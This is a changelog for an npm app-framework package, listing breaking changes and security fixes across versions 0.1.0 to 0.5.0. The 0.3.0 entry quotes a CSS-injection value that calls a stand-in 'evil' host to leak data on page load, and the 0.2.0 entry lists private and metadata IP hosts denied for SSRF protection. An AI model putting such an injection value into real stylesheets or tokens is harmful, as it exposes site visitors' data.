# Changelog

All notable changes to `@noidmejs/atomkit-app`. Pre-1.0: minor versions may break.

## 0.5.0

### Security
- Requires `@noidmejs/atomkit` `^0.8.0`. 0.7.0's `maskNode` leaked unknown node-level
  fields through `stripDocument`, which is the function this package relies on to
  enforce governance at egress before a page is served or baked.

### Changed
- Requires `@noidmejs/atomkit-compiler` `^0.5.0`, bumped in lockstep.

## 0.4.0

### BREAKING
- **Node >= 22.** `engines` was `">=18"`, but Node 18 reached end-of-life on
  2025-04-30 and Node 20 on 2026-04-30 (per `nodejs/Release/schedule.json`).
  Installing on Node 18/20/21 now fails with `EBADENGINE` under `--engine-strict`.
  CI tests on 22 (maintenance LTS), 24 (active LTS) and 26 (current).

### Changed
- `typescript` devDependency → `^7.0.0`; `@types/node` → `^22` (tracks the
  MINIMUM supported runtime, not the newest — typing against Node 26 while
  claiming `>=22` would bless APIs that do not exist on the oldest runtime we support).
- `prepublishOnly` now runs `npm run build && npm test`, not just the build.
- Requires `@noidmejs/atomkit` `^0.7.0`, `@noidmejs/atomkit-compiler` `^0.4.0`,
  `@noidmejs/atomkit-http` `^0.4.0`.

## 0.3.0

### Security — BREAKING
- **The dev and start servers bound every network interface.** Both called
  `server.listen(port)` with no host, which binds the unspecified address — while
  SECURITY.md claimed localhost and `start` even logged `http://localhost`. Anyone
  on the same LAN could reach pages rendered with your config's `secrets` and
  whatever governance context you set for testing (e.g. `canViewPii: true`). Both
  now bind **`127.0.0.1`**; pass **`--host 0.0.0.0`** to opt in explicitly.
- **`atomkit.config.json` was parsed with no validation, and governance flags were
  coerced with `!!`.** `"canViewPii": "false"` — a truthy *string*, and the single
  most likely JSON mistake — silently granted PII and protected-content visibility,
  and the build then baked that content permanently into publicly served HTML. The
  config is now strictly validated (types + unknown keys) and fails the build loudly;
  `canViewPii` / `canViewProtected` / `analytics` require an exact `true`.
- **Design tokens re-opened the CSS-exfiltration hole** that core's `clean()` closes.
  `tokensCss` stripped only `<>{}`, so `"red;background:url(https://evil/?leak)"`
  became a second live declaration on `:root` and fired a request on page load.
  Token values are now held to the same bar as style values, and rejected outright.

### Fixed
- **`build` claimed the ejected component keeps a client-side fetch. It never did.**
  `codegen` emits no fetch, so a data-bound node in `components/*.tsx` renders its
  authored fallback forever, and responsive overrides and `video` are dropped. The
  build now prints every such divergence per page, and the comment + README that
  asserted otherwise are corrected.

## 0.2.0
### Added — server-side data binding
- An `api=`-bound `.aql` node is now resolved **on the server at build/dev time**
  via `@noidmejs/atomkit-http` and **baked into the static HTML** (the output still
  ships no client JS). New `resolveData` pass + `data` config block
  (`allowHosts` / `secrets` / `timeoutMs`). Each render/build resolves fresh
  (deduped within a page); no cross-render cache, so builds are reproducible.
- Resolution delegates SSRF control to `createProxy().resolve()` (allow-list on the
  initial host **and** every redirect hop) and additionally **denies private/reserved
  IP-literal hosts** (`localhost`, `169.254.169.254`, LAN, ULA, CGNAT).
- **Fail-closed**: an unlisted host, a private IP, a fetch error, an empty result, or
  a non-scalar value all DROP the binding so the authored fallback text renders (with
  a build/dev note). A node flagged `pii` is masked and never fetched — governance
  (`stripDocument`) runs before resolution.
- Scaffold gains `app/data.aql` (a live demo binding to `jsonplaceholder.typicode.com`,
  including a `pii`-masked node) and a `data.allowHosts` entry.
### Changed (breaking)
- `renderAqlSource()` and `build()` are now **async** (they `await` data resolution);
  `build(cwd, opts)` takes an options object (`{ out?, fetchImpl? }`) instead of a
  string. The CLI awaits the build. Update programmatic callers to `await`.
### Security
- Curated `cfg.data.secrets` only — the whole `process.env` is never exposed to
  `{{secret.X}}`. Drop notes never print resolved URLs or raw upstream errors.

## 0.1.0
- Initial release — the AQL app framework + generator:
  - **`create`** — scaffold a project (`app/*.aql`, `atomkit.config.json`, `public/`).
  - **`dev`** — file-based routing over `app/**/*.aql`, SSR via the atomkit runtime,
    dependency-free SSE live reload, `localhost:3300` by default.
  - **`build`** — every page → **static HTML** (governance enforced at egress) +
    **standalone React** (`components/*.tsx` via `@noidmejs/atomkit-compiler`, no
    runtime lock-in); `public/` copied; `routes.json` manifest.
  - **`start`** — static-serve the build with clean-URL resolution.
  - Governance enforced on every served/built page; sanitised design-token
    injection; path-traversal-guarded static serving.
  - Programmatic API mirrors the CLI (`create` / `dev` / `build` / `start` /
    `collectRoutes` / `matchRoute` / `renderAqlSource` / `pageShell` / `loadConfig`).
